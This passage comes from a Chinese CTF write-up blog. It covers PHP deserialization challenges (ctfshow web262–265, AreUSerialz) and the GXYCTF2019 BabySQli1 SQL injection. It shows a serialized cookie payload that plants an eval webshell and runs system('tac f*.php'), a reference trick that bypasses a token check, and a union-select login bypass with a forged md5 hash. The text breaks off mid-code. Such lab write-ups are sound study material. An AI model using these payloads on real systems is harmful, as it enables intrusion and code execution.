class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStatus</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;status=<span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br> <br>output：<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;1.php&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">34</span>:<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-subst">$_POST</span>[1]);phpinfo();?&gt;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;status&quot;</span>;N;&#125;<br> <br>fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==<br><br></code></pre></td></tr></table></figure><p>具体实操：</p><p>先访问index.php,修改limit的cookie为</p><p>fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs&#x2F;PiI7czo2OiJzdGF0dXMiO047fQ&#x3D;&#x3D;</p><p>写进去之后，访问check.php?u&#x3D;123&amp;pass&#x3D;123</p><p>最后访问log-1.php,成功rce</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">post；<br><span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*.php&#x27;</span>);<br>web264<br></code></pre></td></tr></table></figure><hr><h2 id="web-264"><a href="#web-264" class="headerlink" title="web-264"></a>web-264</h2><p>同262</p><hr><h2 id="web-265-引用"><a href="#web-265-引用" class="headerlink" title="web-265 &amp;引用"></a>web-265 &amp;引用</h2><p>首先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-04 23:52:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>]);<br><span class="hljs-variable">$ctfshow</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>这道题只需要让token全等于password即可，但是这里token进行了md5加密，而且还是随机数，但是不用慌这里用&amp;引用，让password引用token的值即可</p><p>构造链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = &amp;<span class="hljs-variable language_">$this</span>-&gt;token;<span class="hljs-comment">//用&amp;引用token的值，这样不管token怎样变化，password永远和token相等</span><br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>));<br><br>output：O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;ctfshowAdmin&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-BabySQli1</title>
      <link href="/2025/03/14/GXYCTF2019-BabySQli1/"/>
      <url>/2025/03/14/GXYCTF2019-BabySQli1/</url>
      
        <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h2><p>1、首先启动靶机并访问，映入眼帘的就是一个登录系统，很明显考的是Sql注入。</p><p><img src="/../image/GXYCTF2019-BabySQli1-1.png"></p><p>2、admin登录，显示wrong pass，查看源代码发现一串加密字符串</p><p><img src="/../image/GXYCTF2019-BabySQli1-2.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br></code></pre></td></tr></table></figure><p>3、搞了半天没搞懂这是啥加密，结果查了一下我说是base32+base64混合加密。所以我们需要先进行base32解码再进行base64解码，最后就得到了一段sql语句</p><p><img src="/../image/GXYCTF2019-BabySQli1-3.png"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>4、从这段语句可以知道，使用了单引号过滤。然后开始sql注入测试</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">先测试下万能密码<br>admin&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">#//显示do not hack me!，推测是进行了过滤</span><br><br><br>这里可以进行手动测试或者用字典爆破来测试出所有被过滤的关键字。<br>我这里手测发现过滤了()、=、<span class="hljs-keyword">or</span><br><br>没有过滤union和select，所以我们这里判断下列数，因为<span class="hljs-keyword">or</span>被过滤了，所以不能使用<span class="hljs-keyword">order</span> <span class="hljs-title">by</span><br>admin&#x27; <span class="hljs-keyword">group</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#//测出有3列</span><br></code></pre></td></tr></table></figure><p>5、这时候实在做不下去了，查了下题解，结果跟我说要看源码，我无语了，那就看吧</p><p><img src="/../image/GXYCTF2019-BabySQli1-4.png"></p><p>代码审计：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br><span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>echo <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br>首先正则可以看出我们测试出来的被过滤的字符没有问题，就是这几个。<br>然后就是重点来了：<br>这里会将查询后的结果分为<span class="hljs-number">3</span>个字段赋值给<span class="hljs-variable">$arr</span>，然后我们如果要得到flag的话，必须让<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>，即第二个字段名需要为<span class="hljs-string">&quot;admin&quot;</span>，然后我们输入的password在md5加密后需要等于第三个字段名，这样就能拿到flag。<br><br>注意：<span class="hljs-variable">$arr</span>[]数组是从<span class="hljs-number">0</span>下标开始的，所以<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>]为第二个字段名<br></code></pre></td></tr></table></figure><p>6、payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST：<br><span class="hljs-attribute">name</span>=-1&#x27; union select 1,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;<span class="hljs-attribute">pw</span>=123456<br><br><span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>即为123456密码md5加密后的结果。<br>注意：这里闭合前需要填一个不存在的用户名，这样才会回显我们联合查询的数据<br></code></pre></td></tr></table></figure><p>然后就拿到flag了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020青龙组-AreUSerialz1</title>
      <link href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"/>
      <url>/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/</url>
      
        <content type="html"><![CDATA[<h2 id="网鼎杯-2020-青龙组-AreUSerialz11"><a href="#网鼎杯-2020-青龙组-AreUSerialz11" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz11"></a>[网鼎杯 2020 青龙组]AreUSerialz11</h2><p>1、首先启动靶机并访问，上来就是一堆代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>2、代码审计</p><p>下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">首先看下面的代码，先不管类<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里对我们get传参str先转换为字符串，然后进行了验证，只允许传入ascii码值32到125之间的字符（过滤掉的空字符，这对我们后面有影响），如果判断为true就会对我们传入的进行反序列化。</p><hr><p>类代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span 